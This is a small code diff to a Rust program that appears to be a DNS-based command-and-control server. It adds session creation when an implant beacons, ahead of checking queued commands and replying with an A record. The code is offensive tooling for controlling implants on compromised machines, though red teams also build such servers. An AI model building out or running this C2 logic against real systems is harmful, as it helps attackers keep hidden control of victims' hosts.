@@ -1,8 +1,10 @@
 mod server;
 use server::*;
+use std::io::{self, Write};
 use std::net::UdpSocket;
 use std::sync::{Arc, Mutex};
 use std::thread;
+use std::time::Duration;
 
 fn main() -> std::io::Result<()> {
     print_banner();
@@ -51,6 +53,7 @@ fn main() -> std::io::Result<()> {
                         match c2_req {
                             C2Request::Beacon { implant_id } => {
                                 println!("    [BEACON] {}", implant_id);
+                                state.get_or_create_session(&implant_id);
                                 let has_cmds = state.has_commands(&implant_id);
                                 let response = build_a_record_response(
                                     &buf[..len],
